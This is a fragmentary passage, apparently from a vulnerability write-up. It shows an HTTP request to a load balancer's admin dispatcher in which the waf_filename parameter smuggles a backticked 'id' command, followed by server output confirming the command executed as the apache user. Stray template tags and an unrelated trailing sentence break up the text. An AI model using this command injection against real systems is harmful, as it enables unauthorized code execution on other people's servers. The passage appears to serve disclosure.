...
GET /lbadmin/ajax/js_dispatcher.php?option=waf_log&waf_filename=modsec_audit.log%7c%60{% highlight ruby %}id{% endhighlight %}%60&log_option=base HTTP/1.1
Host: 10.0.0.99:9443
...
<p><em>Thank you.</em></p><p><pre>ensure_access(): &#039;chown  --no-dereference root:apache /var/log/httpd/modsec_audit.log|`id`&#039; failed: errno 127, sh: {% highlight ruby %}uid=48(apache){% endhighlight %}: command not found</pre></p><h3>Trace:</h3>
...
but interestingly, they have some reputable partnership
